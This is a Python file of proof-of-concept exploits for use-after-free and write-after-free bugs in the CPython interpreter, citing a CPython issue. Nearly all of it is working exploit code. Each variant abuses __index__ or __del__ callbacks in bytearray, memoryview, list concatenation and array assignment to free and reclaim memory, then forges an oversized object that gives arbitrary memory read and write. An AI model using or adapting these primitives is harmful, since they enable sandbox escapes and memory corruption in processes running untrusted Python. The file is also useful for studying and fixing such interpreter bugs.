# most UAF/WAF bugs only work on release builds reliably

# POC Exploit for Write After Free & Use After Free
# https://github.com/python/cpython/issues/91153
to_write_after_free = bytearray(bytearray.__basicsize__)
class sneaky:
    def __index__(self):
        global to_corrupt_ob_exports, to_uaf
        to_corrupt_ob_exports = to_write_after_free.clear() \
                              or bytearray(bytearray.__basicsize__)
        to_uaf = memoryview(to_corrupt_ob_exports)
        return 0

to_write_after_free[-tuple.__itemsize__] = sneaky()
occupy_uaf = to_corrupt_ob_exports.clear() \
          or bytearray()

view_backing = to_uaf.cast('P')
view = occupy_uaf

view_backing[2] = (2 ** (tuple.__itemsize__ * 8) - 1) // 2
memory = memoryview(view)

# UAF in bytearray_ass_subscript
to_write_after_free = bytearray(bytearray.__basicsize__)
class sneaky:
    def __index__(self):
        del to_write_after_free[:] # free to_write_after_free memory
        s.to_corrupt_ob_exports = bytearray(bytearray.__basicsize__)
        # fill to_write_after_free memory with to_corrupt_ob_exports
        to_write_after_free.__init__(bytearray.__basicsize__) # refill to_write_after_free
        s.to_uaf = memoryview(s.to_corrupt_ob_exports) # make a memoryview over to_write_after_free memory
        return -tuple.__itemsize__

to_write_after_free[s:=sneaky()] = 0 # write zero into to_corrupt_ob_exports->ob_exports
occupy_uaf = s.to_corrupt_ob_exports.clear() \
          or bytearray()
# free backing mem of to_corrupt_ob_exports (while retaining view over it)
# fill backing mem with new bytearray

# now occupy_uaf occupies the view backing of to_uaf

view_backing = s.to_uaf.cast('P')
view = occupy_uaf

view_backing[2] = (2 ** (tuple.__itemsize__ * 8) - 1) // 2
# write max size into view->ob_size
memory = memoryview(view)
# Done :)

# memoryview Use After Free (memory_ass_sub)
uaf_backing = bytearray(bytearray.__basicsize__)
uaf_view = memoryview(uaf_backing).cast('n') # ssize_t format

class weird_index:
    def __index__(self):
        uaf_view.release() # release memoryview (UAF)
        # free `uiaf_backing` memory and allocate a new bytearray into it
        self.memory_backing = uaf_backing.clear() or bytearray()
        return 2 # `ob_size` idx

# by the time this line finishes executing, it writes the max ptr size
# into the `ob_size` slot (2) of `memory_backing`
uaf_view[w:=weird_index()] = (2 ** (tuple.__itemsize__ * 8) - 1) // 2
memory = memoryview(w.memory_backing)

# memoryview Use After Free (pack_single)
uaf_backing = bytearray(bytearray.__basicsize__)
uaf_view = memoryview(uaf_backing).cast('n') # ssize_t format

class weird_index:
    def __index__(self):
        uaf_view.release() # release memoryview (UAF)
        # free `uaf_backing` memory and allocate a new bytearray into it
        self.memory_backing = uaf_backing.clear() or bytearray()
        return (2 ** (tuple.__itemsize__ * 8) - 1) // 2 # `ob_size` value

# by the time this line finishes executing, it writes the max ptr size
# into the `ob_size` slot (2) of `memory_backing`
# this is because the buffer that uaf_view references now points to `memory_backing`
uaf_view[2] = w = weird_index()
memory = memoryview(w.memory_backing)

# Use After Free in list_concat by abusing GC
a = [None] * 15
fake_mem = b''.join([
    (14).to_bytes(tuple.__itemsize__, 'little'),
    id(bytearray).to_bytes(tuple.__itemsize__, 'little'),
    ((2 ** (tuple.__itemsize__ * 8) - 1) // 2).to_bytes(tuple.__itemsize__, 'little'),
    bytes(4 * tuple.__itemsize__)
])
addr = (id(fake_mem) + bytes.__basicsize__ - 1).to_bytes(tuple.__itemsize__, 'little')
class A:
    def __init__(self):
        self.s = self
    def __del__(self):
        a.clear() # shrink a
        bytearray(addr * 15).clear() # reclaim a's memory, fill with addr * 15 then free
        a.append(None) # add single value to a to avoid some corruption that occurs otherwise
        # now, when the function returns, the memory used for the new list is the same memory
        # that the bytearray used to hold and since a has shrank, we never overwrite what was there
        # allowing us to reference a fake bytearray

v = []
A()
while len(a) > 1:
    v.append(a + [])

mem_array = v[-1][-1]
memory = memoryview(mem_array)

a = [None]
fake_mem = b''.join([
    (14).to_bytes(tuple.__itemsize__, 'little'),
    id(bytearray).to_bytes(tuple.__itemsize__, 'little'),
    ((2 ** (tuple.__itemsize__ * 8) - 1) // 2).to_bytes(tuple.__itemsize__, 'little'),
    bytes(4 * tuple.__itemsize__)
])
addr = (id(fake_mem) + bytes.__basicsize__ - 1).to_bytes(tuple.__itemsize__, 'little') * 15
class A:
    def __init__(self):
        self.s = self
    def __del__(self):
        a.clear()
        bytearray(addr).clear()

v = []
A()
while len(a) == 1:
    v.append(a * 15)

mem = memoryview(v[-1][-1])
print(mem, len(mem))

# WAF in array.*_setitem
from array import array

class A:
    def __init__(self):
        self.a = array('l', [0]*((bytearray.__basicsize__ // 8) * 5000))

    def __index__(self):
        del self.a[:]
        self.a.extend([0]*(bytearray.__basicsize__ // 8))
        self.b = [bytearray() for _ in range(5000)]
        return (2 ** (tuple.__itemsize__ * 8) - 1) // 2

s.a[10] = (s:=A())
for mem in s.b:
    if len(mem) > 1:
        break

mem = memoryview(mem)
print(mem, len(mem))
# Done :)